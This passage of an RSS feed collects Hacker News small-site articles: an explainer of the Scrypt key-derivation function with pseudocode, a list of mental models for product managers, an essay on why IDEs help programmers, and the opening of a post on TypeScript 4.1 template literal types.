some of those have worked out occasionally, but Breezy is the main tool that we use to bring everything together.</span></p><p><span>One of the things we’ve learned through the hiring process is that it is better to hire people who have had experience working remotely somewhere else before. Whenever people have not worked out, it’s been generally one of two things. It’s either been that they have not worked somewhere remotely before, and some people are just not capable of it for reasons that …</span></p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://youteam.io/blog/dnsfilter-interview/">https://youteam.io/blog/dnsfilter-interview/</a></em></p>]]>
            </description>
            <link>https://youteam.io/blog/dnsfilter-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059715</guid>
            <pubDate>Wed, 11 Nov 2020 16:29:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Intro to the Scrypt Hash]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25059496">thread link</a>) | @lanecwagner
<br/>
November 11, 2020 | https://qvault.io/2020/07/25/very-basic-intro-to-the-scrypt-hash/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/07/25/very-basic-intro-to-the-scrypt-hash/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>Scrypt is a slow-by-design <a href="https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">hash function</a> or more accurately, a <a href="https://qvault.io/2019/12/30/very-basic-intro-to-key-derivation-functions-argon2-scrypt-etc/">KDF</a> function. Simply put, the purpose of the Scrypt hash is to take some input data, and create a fingerprint of that data, but to do it very slowly. A common use-case is to take a password and create an n-bit private key, which is much longer and more secure. Here at <a href="https://app.qvault.io/">Qvault,</a> we use a similar KDF for securing user passwords.</p>



<p>For example, let’s pretend your password is <code>password1234</code>. By using Scrypt, we can extend that deterministically into a 256-bit key:</p>



<pre><code>password1234 -&gt; 
AwEEDA4HCwQFAA8DAwwHDQwPDwUOBwoOCQACAgUJBQ0JAAYNBAMCDQ4JCQgLDwcGDQMDDgMKAQsNBAkLAwsACA==</code></pre>



<p>That long 256-bit key can now be used as a private key to encrypt and decrypt data. For example, it could be the key in an <a href="https://qvault.io/2020/01/02/very-basic-intro-to-aes-256-cipher/">AES-256</a> cipher.</p>



<h2>Why Not Encrypt With The Password Directly?</h2>



<p>Most encryption algorithms, including AES-256, require that a key of sufficient length is used. By hashing the password, we can derive a longer, more secure, fixed-size key.</p>



<p>Furthermore, using a KDF like Scrypt provides additional benefits over a traditional hash function like <a href="https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/">SHA-2</a>:</p>



<ul><li>Computationally expensive and slow</li><li>Memory intensive (potentially several gigabytes of RAM is used to execute the hash)</li></ul>



<p>Often times <a href="https://qvault.io/2020/02/11/how-do-brute-force-attackers-know-they-found-the-key/">brute-force attackers</a> will try to break encryption by guessing passwords over and over until they get it right. AES-256 and SHA-2 are fast, so an attacker would be able to guess many passwords per second. By using a slow hashing function like Scrypt to derive a key, we can force the attacker to waste more resources trying to break in.</p>



<h2>Scrypt Step-by-Step</h2>



<p>Scrypt can be visualized by some psuedo-code:</p>



<pre><code lang="go">func Scrypt(
	passphrase, // string of characters to be hashed
	salt,  // random salt
	costFactor, // CPU/Memory cost, must be power of 2
	blockSizeFactor,
	parallelizationFactor, // (1..232-1 * hLen/MFlen)
	desiredKeyLen // Desired key length in bytes
) derivedKey {
	// we'll get to this
}</code></pre>



<p>Let’s go through the steps of converting those inputs into the desired <code>derivedKey</code></p>



<h3>1 – Define Blocksize</h3>



<pre><code lang="go">const blockSize = 128 * blockSizeFactor</code></pre>



<h3>2 – Generate Initial Salt</h3>



<p>Scrypt uses <a aria-label=" (opens in a new tab)" href="https://en.wikipedia.org/wiki/PBKDF2" target="_blank" rel="noreferrer noopener nofollow">PBKDF2</a> as a child key-derivation function. We use it to generate an initial salt. <code>PBKDF2</code> has the following signature:</p>



<pre><code lang="go">func PBKDF2(
	prf,
	password,
	salt,
	numIterations,
	desiredKeyLen
) derivedKey {}</code></pre>



<p>We use it as follows:</p>



<pre><code lang="go">const initialSalt = PBKDF2(HMAC-SHA256, passphrase, salt, 1, blockSize * parallelizationFactor)</code></pre>



<h3>3 – Mix Salt</h3>



<p>Next, we mix the salt. We split <code>initialSalt</code> into <code>splitSalt</code>, which is a 2D array of bytes. Each sub-array contains 1024 bytes</p>



<pre><code lang="go">splitSalt := [][1024]byte(initialSalt)
for i, block := range splitSalt {
	newBlock := roMix(block, costFactor)
	splitSalt[i] = newBlock
}</code></pre>



<p>Where <code>roMix</code> is the following function:</p>



<pre><code lang="go">func roMix(block, iterations){
	v := []
	x := block
	for i := 0; i &lt; iterations; i++ {
		v[i] = x
		x = blockMix(x)
	}
	for i := 0; i &lt; iterations; i++ {
		j := integerify(x) % iterations
		x = blockMix(x ^ v[j])
	}
	return x
}</code></pre>



<p><code>integerify</code> is defined by <a aria-label=" (opens in a new tab)" href="https://tools.ietf.org/html/rfc7914" target="_blank" rel="noreferrer noopener nofollow">RFC-7914</a> and <code>blockMix</code> is:</p>



<pre><code lang="go">func blockMix(block){
	r := len(block) / 128
	// split block into an array of 2r 64-byte chunks
	chunks := get2r64ByteChunks()

	x := chunks[len(chunks)-1]
	y := []
	for i := 0; i &lt; len(chunks); i++{
		x = salsa20-8(x ^ chunks[i])
		y[i] = x
	}
	return [y[0], y[2], ...y[2r-2], y[1], y[3], ...y[2r-1]]
}</code></pre>



<p><code>salsa20-8</code> is the 8-round version of the algorithm defined <a href="https://en.wikipedia.org/wiki/Salsa20" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">here</a>.</p>



<h3>4 – Finalize Salt</h3>



<p>Now <code>splitSalt</code> has been mixed in such a computationally exhausting way that we will call it an <code>expensiveSalt</code>. Expensive salt will be a single array of bytes, so we need to concatenate all the subarrays in <code>splitSalt</code>.</p>



<pre><code lang="go">expensiveSalt := append([], splitSalt...)</code></pre>



<h3>5 – Return Final KDF</h3>



<pre><code lang="go">return PBKDF2(HMAC-SHA256, passphrase, expensiveSalt, 1, desiredKeyLen)</code></pre>



<p>The final pseudocode for our top level function is as follows:</p>



<pre><code lang="go">func Scrypt(
	passphrase, // string of characters to be hashed
	salt,  // random salt
	costFactor, // CPU/Memory cost, must be power of 2
	blockSizeFactor,
	parallelizationFactor, // (1..232-1 * hLen/MFlen)
	desiredKeyLen // Desired key length in bytes
) derivedKey {
	const blockSize = 128 * blockSizeFactor

	const initialSalt = PBKDF2(HMAC-SHA256, passphrase, salt, 1, blockSize * parallelizationFactor)

	splitSalt := [][1024]byte(initialSalt)
	for i, block := range splitSalt {
		newBlock := roMix(block, costFactor)
		splitSalt[i] = newBlock
	}

	expensiveSalt := append([], splitSalt...)

	return PBKDF2(HMAC-SHA256, passphrase, expensiveSalt, 1, desiredKeyLen)
}</code></pre>



<p>Or, if you prefer, the pseudocode as defined by <a href="https://en.wikipedia.org/wiki/Scrypt" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">Wikipedia</a>:</p>



<pre><code lang="">Function scrypt
   Inputs:
      Passphrase:                Bytes    string of characters to be hashed
      Salt:                      Bytes    random salt
      CostFactor (N):            Integer  CPU/memory cost parameter - Must be a power of 2 (e.g. 1024)
      BlockSizeFactor (r):       Integer  blocksize parameter (8 is commonly used)
      ParallelizationFactor (p): Integer  Parallelization parameter. (1..232-1 * hLen/MFlen)
      DesiredKeyLen:             Integer  Desired key length in bytes
   Output:
      DerivedKey:                Bytes    array of bytes, DesiredKeyLen long

   Step 1. Generate expensive salt
   blockSize ← 128*BlockSizeFactor  //Length (in bytes) of the SMix mixing function output (e.g. 128*8 = 1024 bytes)

   Use PBKDF2 to generate initial 128*BlockSizeFactor*p bytes of data (e.g. 128*8*3 = 3072 bytes)
   Treat the result as an array of p elements, each entry being blocksize bytes (e.g. 3 elements, each 1024 bytes)
   [B0...Bp−1] ← PBKDF2HMAC-SHA256(Passphrase, Salt, 1, blockSize*ParallelizationFactor)

   Mix each block in B Costfactor times using ROMix function (each block can be mixed in parallel)
   for i ← 0 to p-1 do
      Bi ← ROMix(Bi, CostFactor)

   All the elements of B is our new "expensive" salt
   expensiveSalt ← B0∥B1∥B2∥ ... ∥Bp-1  //where ∥ is concatenation
 
   Step 2. Use PBKDF2 to generate the desired number of bytes, but using the expensive salt we just generated
   return PBKDF2HMAC-SHA256(Passphrase, expensiveSalt, 1, DesiredKeyLen);</code></pre>




		</div></div>]]>
            </description>
            <link>https://qvault.io/2020/07/25/very-basic-intro-to-the-scrypt-hash/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059496</guid>
            <pubDate>Wed, 11 Nov 2020 16:09:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mental Models for Product Managers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25059450">thread link</a>) | @laybak
<br/>
November 11, 2020 | https://informedpm.com/posts/mental-models | <a href="https://web.archive.org/web/*/https://informedpm.com/posts/mental-models">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>It is trendy to talk about mental models these days, especially in the tech industry. But really, it's just a fancy way of saying "useful ways of thinking".</span></p> <p><span>In this post, I present a collection of mental models that are most relevant to the work of product managers. Some of these are borrowed from other disciplines. And they can be valuable additions to your toolbox for dealing with complexity.</span></p> <p><span>I intend for these to be jumping-off points for further thinking and learning. And not an exhaustive list. For a general introduction to mental models, here is a </span> <a href="https://fs.blog/mental-models/" target="_blank"><span>useful article by Farnam Street</span></a> <span>.</span></p> <p><span>Let's get started.</span></p>  <p><h2><span>Part 1: Learning </span></h2></p> <p><h3><span>Ensemble of Models</span></h3></p> <p><span>All models are wrong because they simplify. They omit details. For this reason, we should not rely on any single model. Instead, a many-model approach allows you to explain more and avoid blindspots. This works because the wrongness in each model tends to cancel out.</span></p> <p><span>Charlie Munger, an investor who popularized mental models, advocates combining them in a "latticework of models". And in machine learning, </span> <a href="https://en.wikipedia.org/wiki/Ensemble_learning" target="_blank"><span>ensemble methods</span></a> <span> can be an effective approach. </span></p> <p><span>This is useful when considering the diverse perspectives and opinions of your stakeholders.</span></p>  <p><h3><span>Learning by Doing</span></h3></p> <p><span>Which mental models matter in which circumstances? Knowing that is the hard part. </span></p> <p><span>A lot of skills and knowledge are implicit. They are hard to codify, or even articulate. You won't find them in neatly packaged books or elegant theories. </span></p> <p><span>But you can hone your judgment by maintaining contact with reality. You can put in iterations, and let your learning compound over time.</span></p>  <p><h3><span>Bayesian Updating</span></h3></p> <p><span>We get new information all the time. Feedback from a customer, changes in the industry, unforeseen challenges etc.</span></p> <p><span>Bayes' theorem provides a mathematical approach to weigh the old hypothesis (the "prior", initial belief) and new evidence. Bayesian inference is widely applicable in many areas, including AI and machine learning. Fun fact, it is also effective for </span> <a href="https://en.wikipedia.org/wiki/Bayesian_search_theory" target="_blank"><span>finding missing aircrafts</span></a> <span>.</span></p> <p><span>Here is an engaging introductory video on the topic.</span></p> <div><p><iframe src="https://www.youtube.com/embed/HZGCoVF3YvM?title=0&amp;byline=0&amp;portrait=0" frameborder="0"></iframe></p></div>  <p><h3><span>Process vs Outcome</span></h3></p> <p><span>It is tempting to judge our decisions by the outcome. But good decisions can lead to bad outcomes. And vice versa.</span></p> <p><span>Having a good process with a good outcome is ideal. Whereas a bad process with a good outcome is just gambling with blind luck.</span></p> <p><span>One way to calibrate your decisions over time is to document your decisions in a </span> <a href="https://fs.blog/2014/02/decision-journal/" target="_blank"><span>decision journal</span></a> <span>. Good things to write down include the context for the decision, alternatives and the range of outcomes, what you expect to happen, and how you feel mentally and physically.</span></p>  <p><h3><span>Dumb Idea Paradox</span></h3></p> <p><span>Many of the big success stories sounded stupid. Red Bull is an expensive drink that tastes disgusting. Snapchat is an app for sending disappearing photos. </span></p> <p><span>In the book </span> <a href="https://www.amazon.com/Loonshots-Nurture-Diseases-Transform-Industries-ebook/dp/B07D2BKVQR" target="_blank"><span>Loonshots</span></a> <span>, Safe Bahcall gave examples of brilliant ideas that had to survive "the Three Deaths" before finally succeeding. He wrote, "In the real world, ideas are ridiculed, experiments fail, budgets are cut, and good people are fired for stupid reasons." Andrew Chen also wrote about this in </span> <a href="https://andrewchen.co/dumb-idea-paradox/" target="_blank"><span>Dumb Idea Paradox</span></a> <span>.</span></p>  <p><h3><span>Satisficing</span></h3></p> <p><span>We make decisions in a world of uncertainty, with incomplete and imperfect information. Certainty is an illusion. It is better to be vaguely right than precisely wrong. </span></p> <p><span>﻿</span> <a href="https://en.wikipedia.org/wiki/Satisficing" target="_blank"><span>Satisficing</span></a> <span> (satisfy + suffice), introduced by&nbsp;</span> <a href="https://en.wikipedia.org/wiki/Herbert_A._Simon" target="_blank"><span>Herbert A. Simon</span></a> <span>, is about making decisions that are not perfect, but good enough. You can satisfice either by finding optimal solutions for a simplified world, or satisfactory solutions for a realistic one.</span></p>  <p><h2><span>Part 2: Collaboration &amp; Execution</span></h2></p> <p><h3><span>Maker's Schedule. Manager's Schedule</span></h3></p> <p><span>Context switching is costly, especially for creative work. In </span> <a href="http://www.paulgraham.com/makersschedule.html" target="_blank"><span>Paul Graham's popular essay</span></a> <span>, he discussed the cost of meetings and interruptions:</span></p> <p><em>"When you're operating on the maker's schedule, meetings are a disaster. A single meeting can blow a whole afternoon, by breaking it into two pieces each too small to do anything hard in."</em></p> <p><span>It is important to recognize the nature of different types of work. This way we can get more focused time for deep work, for ourselves and for our team.</span></p>  <p><h3><span>Working Memory and Cognitive Load</span></h3></p> <p><span>﻿</span> <a href="https://en.wikipedia.org/wiki/Working_memory" target="_blank"><span>Working memory</span></a> <span> is basically </span> <em>"how much stuff you can think about at the same time"</em> <span>. Each of us has a limited capacity. The "</span> <a href="https://en.wikipedia.org/wiki/The_Magical_Number_Seven%2C_Plus_or_Minus_Two" target="_blank"><span>magic number</span></a> <span>" of objects an average human can hold in short-term memory is 7, plus or minus 2.</span></p> <p><span>In the workplace, there is a lot of information to process. And the sheer load can quickly overwhelm our working memory.</span></p> <p><span>This calls for building a system to work around this. It could mean regular follow-ups, reminders, repetition, and good note-taking and documentation.</span></p>  <p><h3><span>Circle of Competence</span></h3></p> <p><span>﻿</span> <a href="https://en.wikipedia.org/wiki/Circle_of_competence" target="_blank"><span>Circle of competence</span></a> <span> is a mental model developed by Warren Buffett and Charlie Munger. Here's how Buffett summarized it:</span></p> <p><em>"Know your circle of competence, and stick within it. The size of that circle is not very important; knowing its boundaries, however, is vital."</em></p> <p><span>Being clear about what you know and what you think you know can keep your hubris in check. It can also help you identify blind spots and areas of improvement. </span></p> <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/circle-of-competence.png"></p>  <p><h3><span>Batch Processing</span></h3></p> <p><span>Instead of completing tasks in the order that they come, you can often save time by grouping similar tasks together. It reduces costly context switching and interrupts by consolidating repetitive tasks that are not time-sensitive.</span></p> <p><span>This approach can be helpful in answering emails, reading news articles, processing customer feedback etc. As an added benefit, once you batch the tasks, they also tend to be easier to delegate or automate.</span></p> <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/batch-processing.png"></p>  <p><h3><span>Incentives</span></h3></p> <p><span>All living creatures respond to incentives. That is, the proverbial carrot and stick. Behaviours that are rewarded are reinforced.</span></p> <p><span>Knowing this helps us understand the true motivation of our partners, stakeholders, and even customers. This allows us to influence without direct power.</span></p>  <p><h3><span>Goodhart's Law</span></h3></p> <p><span>It is important to consider incentives when deciding measurements of success and metrics to focus on. </span></p> <p><span>Goodhart's Law was named after the economist Charles Goodhart. The general version, phrased by anthropologist Marilyn Strathern, states that "</span> <em>When a measure becomes a target, it ceases to be a good measure</em> <span>."
to be a good measure." </span></p> <p><span>It is possible that some stakeholders can "game the system" and artificially inflate metrics in ways that don't reflect customer value.</span></p> <p><span>We need to be careful about what to measure and consider the incentives of the individual stakeholders. </span></p>  <p><h3><span>Persuasion</span></h3></p> <p><span>To make change happen, persuasion is essential. I have compiled the models, principles, and tactics on this topic in a </span> <a href="https://informedpm.com/posts/persuasion-product-manager" target="_blank"><span>separate post</span></a> <span>. </span></p>  <p><h2><span>Part 3: Systems Thinking</span></h2></p> <p><span>Product managers routinely deal with complex systems. A product is a system of features, stakeholders, processes, customers, other players in the market, changing industry and economic trends etc.</span></p> <p><span>A system is more than the sum of its parts. Systems thinking allows us to better understand the interconnections of the different parts.</span></p>  <p><h3><span>Feedback Loops</span></h3></p> <p><span>A feedback loop is a closed chain of causal connections formed by routing an output of a system back as an input. </span></p> <p><span>Different feedback structures can produce drastically different behaviours. Balancing feedback loops lead to stability or an equilibrium. Whereas reinforcing feedback loops lead to exponential growth or collapses. </span></p> <p><span>Understanding the structure of the system helps us understand its behaviours.</span></p> <p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/General_Feedback_Loop.svg/330px-General_Feedback_Loop.svg.png"></p>  <p><h3><span>Flywheel</span></h3></p> <p><span>The "</span> <a href="https://www.jimcollins.com/article_topics/articles/the-flywheel-effect.html" target="_blank"><span>flywheel effect</span></a> <span>" is a concept developed by researcher Jim Collins. It is a special kind of feedback loop (positive/reinforcing). Push the flywheel. Accelerate momentum. Then repeat.</span></p> <p><span>It is said that Bezos considered Amazon's application of the flywheel concept to be its "secret sauce". </span></p> <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/Amazon%20flywheel.png"></p>  <p><h3><span>Non-Linearity</span></h3></p> <p><span>A linear relationship between two variables can be drawn on a chart with a straight line. In a non-linear relationship, the cause does not produce a proportional effect.     </span></p> <p><span>In a linear system, twice the push can produce twice the response. But in a nonlinear system, twice the push can produce the response squared, a sixth, or no response at all.</span></p> <p><span>For example, doubling the team headcount may yield 1.2X the output. Tripling the price may yield 10X the revenue. </span></p> <p><span>Many relationships in systems are non-linear. This is often a source of surprise. Beware of the trap of assuming (though more intuitive) linear relationships. </span></p>  <p><h3><span>Leverage Points </span></h3></p> <p><span>To get more of a desired outcome, we may have to change the structure of a system. There are leverage points in all systems, where the efforts you apply can yield disproportionate results. For instance, identifying and resolving a bottleneck in a process can be a force multiplier for your efforts.</span></p> <p><span>But as systems scientist </span> <a href="https://en.wikipedia.org/wiki/Donella_Meadows" target="_blank"><span>Donella Meadows</span></a> <span> pointed out, leverage points are often counter-intuitive. And there is no cheap way to mastering the art of identifying leverage points. Though in her book </span> <a href="https://www.amazon.com/Thinking-Systems-Primer-Donella-Meadows/dp/1603580557" target="_blank"><span>Thinking in Systems</span></a> <span>, she proposed a ranked list of leverage point candidates based on her experience. </span></p>  <p><h3><span>Second and Higher Order Effects</span></h3></p> <p><span>First-order effects are the direct consequences of an action. They tend to be immediate. They tend to be obvious. They tend to be static. Thinking in first-order effects often a dangerous over-simplification.</span></p> <p><span>In real life, each agent in the system can respond to changes. Second (and higher) order effects include the effects of subsequent actions. </span></p> <p><span>An example of first-order thinking would be to assume that introducing a new feature will lead to more users coming. Higher-order effects would include increasing technical complexity internally, cluttering and degrading the overall UX, competitors responding by copying the feature or launching a new product etc.</span></p>  <p><h2><span>Part 4: Strategy &amp; Planning</span></h2></p> <p><h3><span>Inversion</span></h3></p> <p><span>Inversion as a thinking tool turns the problem upside down. </span></p> <p><span>Instead of always starting at the beginning, sometimes it is beneficial to start at the end. This thinking can be useful in planning, where we start with the end goal and work backward. For instance, at Amazon, there is a practice of writing a …</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://informedpm.com/posts/mental-models">https://informedpm.com/posts/mental-models</a></em></p>]]>
            </description>
            <link>https://informedpm.com/posts/mental-models</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059450</guid>
            <pubDate>Wed, 11 Nov 2020 16:04:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why an IDE?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25059374">thread link</a>) | @matklad
<br/>
November 11, 2020 | https://matklad.github.io/2020/11/11/yde.html | <a href="https://web.archive.org/web/*/https://matklad.github.io/2020/11/11/yde.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
  
  <p>Nov 11, 2020</p>
  <p>Some time ago I wrote a reddit comment explaining the benefits of IDEs.
Folks refer to it from time to time, so I decided to edit it into an article form.
Enjoy!</p>
<p>I think I have a rather balanced perspective on IDEs.
I used to be a heavy Emacs user (<a href="https://github.com/matklad/.emacs.d/tree/475de5db99f8729c57fed7e6fde4cd06f5ccb62f">old config</a>, <a href="https://github.com/matklad/config/blob/d555642a5a9e4e8b0ca0c77f188ffd976f06327c/home/.emacs.d/init.el">current config</a>).
I worked at JetBrains on <a href="https://github.com/intellij-rust/intellij-rust">IntelliJ Rust</a> for several years.
I used evil mode and vim for a bit, and tried tmux and kakoune.
Nowadays, I primarily use VS Code to develop <a href="https://github.com/rust-analyzer/rust-analyzer/">rust-analyzer</a>: LSP-based editor-independent IDE backend for Rust.</p>
<p>I will be focusing on IntelliJ family of IDEs, as I believe these are the most advanced IDEs today.</p>
<p>The main distinguishing feature of IntelliJ is semantic understanding of code.
The core of IntelliJ is a compiler which parses, type checks and otherwise understands your code.
<a href="https://martinfowler.com/bliki/PostIntelliJ.html">PostIntelliJ</a> is the canonical post about this.
That article also refutes the claim that “Smalltalk IDE is the best we’ve ever had”.</p>
<p>Note that “semantic understanding” is mostly unrelated to the traditional interpretation of “IDE” as <em>Integrated</em> Development Environment.
I personally don’t feel that the “Integrated” bit is all that important.
I commit&amp;push from the command line using Julia scripts, rebase in magit, and do code reviews in a browser.
If anything, there’s an ample room for improvement for the integration bits.
For me, <strong>I</strong> in “<strong>I</strong>DE” stands for “intelligent”, smart.</p>
<p>Keep in mind this terminology difference.
I feel it is a common source of misunderstanding.
“Unix and command line can do anything an IDE can do” is correct about integrated bits, but is wrong about semantical bits.</p>
<p>Traditional editors like Vim or Emacs understand programming languages very approximately, mostly via regular expressions.
For me, this feels very wrong.
It’s <a href="https://stackoverflow.com/a/1732454">common knowledge</a> that HTML shall not be parsed with regex.
Yet this is exactly what happens every time one does <code>vim index.html</code> with syntax highlighting on.
I sincerely think that almost every syntax highlighter out there is wrong and we, as an industry, should do better.
I also understand that this is a tall order, but I do my best to change the status quo here :-)</p>
<p>These are mostly theoretical concerns though.
The question is, does semantic understanding help in practice?
I am pretty sure that it is non-essential, especially for smaller code bases.
My <a href="https://github.com/matklad/rustraytracer">first non-trivial Rust program</a> was written in Emacs, and it was fine.
Most of rust-analyzer was written using pretty spartan IDE support.
There are a lot of insanely-productive folks who are like “sometimes I type vim, sometimes I type vi, they are sufficiently similar”.
Regex-based syntax highlighting and regex based fuzzy symbol search (<a href="https://github.com/universal-ctags/ctags">ctags</a>) get you a really long way.</p>
<p>However, I do believe that features unlocked by deep understanding of the language help.
The funniest example here is extend/shrink selection.
This features allows you to extend current selection to the next encompassing syntactic construct.
It’s the simplest feature a PostIntelliJ IDE can have, it only needs the parser.
But it is sooo helpful when writing code, it just completely blows vim’s text objects out of the water, especially when combined with multiple cursors.
In a sense, this is structural editing which works for text.</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98809232-80e3db00-241d-11eb-883a-5aece9a1dbfc.gif" alt="98809232 80e3db00 241d 11eb 883a 5aece9a1dbfc">
</p>
</div>
<p>If you add further knowledge of the language into a mix, you’ll get the “assists” system: micro-refactoring which available in a particular context.
For example, is the cursor is on a comma in a list of function arguments, you can <span><kbd>alt</kbd>+<kbd>enter</kbd></span> &gt; “swap arguments”, and the order of arguments will be changed in the declaration and on various call-sites as well.
(See <a href="https://rust-analyzer.github.io/blog/2020/09/28/how-to-make-a-light-bulb.html">this post</a> to learn how assists are implemented).</p>
<p>These small dwim things add up to a really nice editing experience, where you mostly express the intention, and the IDE deals with boring syntactical aspects of code editing:</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98812121-37e25580-2422-11eb-8541-2c5a32926845.gif" alt="98812121 37e25580 2422 11eb 8541 2c5a32926845">
</p>
</div>
<p>For larger projects, complex refactors are a huge time-saver.
Doing project-wide renames and signature changes automatically and without thinking reduces the cost of keeping the code clean.</p>
<p>Another transformative experience is navigation.
In IntelliJ, you generally don’t “open a file”.
Instead you think directly in terms of functions, types and modules, and navigate to those using file structure, goto symbol, to do definition/implementation/type, etc:</p>

<p>When I used Emacs, I really admired its buffer management facilities, because they made opening a file I want a breeze.
When I later switched to IntelliJ, I stopped thinking in terms of a set of opened files altogether.
I disabled editor tabs and started using editor splits less often — you don’t need bookmarks if you can just find things.</p>
<p>For me, there’s one aspect of traditional editors which is typically not matched in IDEs out of the box — basic cursor motion.
Using arrow keys for that is slow and flow-breaking, because one needs to move the hand from the home row.
Even Emacs' horrific <kbd>C-p</kbd>, <kbd>C-n</kbd> are a big improvement, and vim’s <kbd>hjkl</kbd> go even further.
One fix here is to configure each tool to use your favorite shortcuts, but this is a whack-a-mole game.
What I do is remapping <kbd>CapsLock</kbd> to act as an extra modifier, such that <kbd>ijkl</kbd> <strong>are</strong> arrow keys.
(There are also keyboards with <a href="https://ultimatehackingkeyboard.com/">hardware</a> <a href="https://ergodox-ez.com/">support</a> for this).
This works in all applications the same way.
Easy motion / ace jump functionality for jumping to any visible character is also handy, and usually is available <a href="https://plugins.jetbrains.com/plugin/9803-acejump-lite">via</a> <a href="https://marketplace.visualstudio.com/items?itemName=lucax88x.codeacejumper">a plugin</a>.</p>
<p>Recent advancements with LSP protocol promise to give one the best of both worlds, where semantic-aware backend and light-weight editor frontend are different processes, which can be mixed and matched.
This is nice in theory, but not as nice in practice as IntelliJ yet, mostly because IntelliJ is way more polished.</p>
<p>To give a simple example, in IntelliJ for “go to symbol by fuzzy name” functionality, I can filter the search scope by:</p>
<div>
<ul>
<li>
<p>is this my code/code from a dependency?</p>
</li>
<li>
<p>is this test/production code?</p>
</li>
<li>
<p>is a symbol a type-like thing, or a method-like thing?</p>
</li>
<li>
<p>path to the module where the symbol is defined.</p>
</li>
</ul>
</div>
<p>VS Code and LSP simply do not have capabilities for such filters yet, they have to be bolted on using hacks.
Support for LSP in other editors is even more hit-and-miss.</p>
<p>LSP did achieve a significant breakthrough — it made people care about implementing IDE backends.
Experience shows that re-engineering an existing compiler to power an IDE is often impossible, or isomorphic to a rewrite.
How a compiler talks to an editor is the smaller problem.
The hard one is building a compiler that can do IDE stuff in the first place.
Check out <a href="https://rust-analyzer.github.io/blog/2020/07/20/three-architectures-for-responsive-ide.html">this post</a> for some of the technical details.
Starting with this use-case in mind saves a lot of effort down the road.</p>
<p>This I think is a big deal.
I hypothesize that the reason why IDEs do not completely dominate tooling landscape is the lack of good IDE backends.</p>
<p>If we look at the set of languages fairly popular recently, a significant fraction of them is dynamically typed: PHP, JavaScript, Python, Ruby.
The helpfulness of an IDE for dynamically typed languages is severely limited: while approximations and heuristics can get you a long way, you still need humans in the loop to verify IDE’s guesses.</p>
<p>There’s C++, but its templates are effectively dynamically typed, with exactly the same issues (and a very complex base language to boot).
Curiously, C looks like a language for which implementing a near-perfect IDE is pretty feasible.
I don’t know why it didn’t happen before CLion.</p>
<p>This leaves C# and Java.
Indeed, these languages are dominated by IDEs.
There’s a saying that you can’t write Java without an IDE.
I think it gets the causation direction backwards: Java is one of the few languages for which it is possible to implement a great IDE without great pain.
Supporting evidence here is Go.
According to <a href="https://blog.golang.org/survey2019-results#TOC_5.">survey results</a>, text editors are stably declining in popularity in favor of IDEs.</p>
<p>I think this is because Go actually has good IDEs.
This is possible because the language is sufficiently statically typed for an IDE to be a marked improvement.
Additionally, the language is very simple, so the amount of work you need to put in to make a decent IDE is much lower than for other languages.
If you have something like JavaScript…​
Well, you first need to build an alternative language for which you can actually implement an IDE (<a href="https://www.typescriptlang.org/">TypeScript</a>) and only then you can build the IDE itself (<a href="https://github.com/microsoft/vscode">VS Code</a>).</p>
</article>

  </div></div>]]>
            </description>
            <link>https://matklad.github.io/2020/11/11/yde.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059374</guid>
            <pubDate>Wed, 11 Nov 2020 15:56:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TypeScript splits the atom A first look at TS 4.1's new template literal types]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25059336">thread link</a>) | @danvk
<br/>
November 11, 2020 | https://effectivetypescript.com/2020/11/05/template-literal-types/ | <a href="https://web.archive.org/web/*/https://effectivetypescript.com/2020/11/05/template-literal-types/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p><img src="https://effectivetypescript.com/images/split-atom.png" width="324" height="298" alt="Splitting a string type"></p><p>TypeScript's type system has grown steadily more powerful over the past five years, allowing you to precisely type more and more patterns in JavaScript. The upcoming <a href="https://github.com/microsoft/TypeScript/issues/40124" target="_blank" rel="noopener" onclick="return trackOutboundLink('', 'https://github.com/microsoft/TypeScript/issues/40124', event);">TypeScript 4.1 release</a> includes a particularly exciting new <a href="https://github.com/microsoft/TypeScript/pull/40336" target="_blank" rel="noopener" onclick="return trackOutboundLink('', 'https://github.com/microsoft/TypeScript/pull/40336', event);">addition</a> to the type system: <em>template literal types</em>.</p>
<p>Template literal types solve a <a href="https://github.com/microsoft/TypeScript/issues/12754" target="_blank" rel="noopener" onclick="return trackOutboundLink('', 'https://github.com/microsoft/TypeScript/issues/12754', event);">long-standing gap</a> in TypeScript's type system and, as I'll argue at the end of the post, they solve it in a particularly <em>TypeScripty</em> way.</p>
<p>To understand template literal types, let's start with a seemingly simple question: what can't you type?</p>
